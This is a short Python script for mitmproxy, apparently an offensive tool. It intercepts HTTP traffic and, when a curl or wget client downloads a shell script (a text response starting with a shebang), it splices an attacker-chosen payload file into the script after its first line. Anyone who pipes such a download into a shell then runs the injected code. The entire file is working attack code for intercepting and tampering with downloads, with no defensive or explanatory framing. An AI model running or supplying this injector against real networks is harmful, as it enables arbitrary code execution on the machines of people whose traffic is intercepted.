#!/usr/bin/python

# Usage: mitmdump -s "inject_shell.py payload.sh"
# (this script works best with --anticache)
from libmproxy.protocol.http import decoded


def start(context, argv):
    if len(argv) != 2:
        raise ValueError('Usage: -s "inject_shell.py payload.sh"')
    context.payload = get_payload(argv[1])


def get_payload(payload_file):
    """
    Read the payload file, and strip out the shebang if it exists
    """
    f = open(payload_file, 'r')
    lines = f.readlines()
    if lines[0].startswith("#!"):
        lines = lines[1:]
    f.close()
    return '\n'.join(lines)


def is_shell_script(resp):
    """
    Returns true if the request is a possible shell script
    """
    shell_content_type = False
    content_type = resp.headers.get_first("content-type", "")
    # if content-type is set, should be text/*
    if content_type != "" and not content_type.startswith('text/'):
        return False
    # and should start with shebang
    if not resp.content.startswith('#!'):
        return False
    return True


def is_cli_tool(req):
    """
    Returns true if the user-agent looks like curl or wget
    """
    user_agent = req.headers.get_first("User-Agent", "")
    if user_agent.startswith('curl'):
        return True
    if user_agent.startswith('Wget'):
        return True
    return False


def response(context, flow):
    resp = flow.response
    req = flow.request
    with decoded(resp):
        if is_shell_script(resp) and is_cli_tool(req):
            flow.response.content = flow.response.content.replace(
                '\n',
                '\n' + context.payload + '\n',
                1)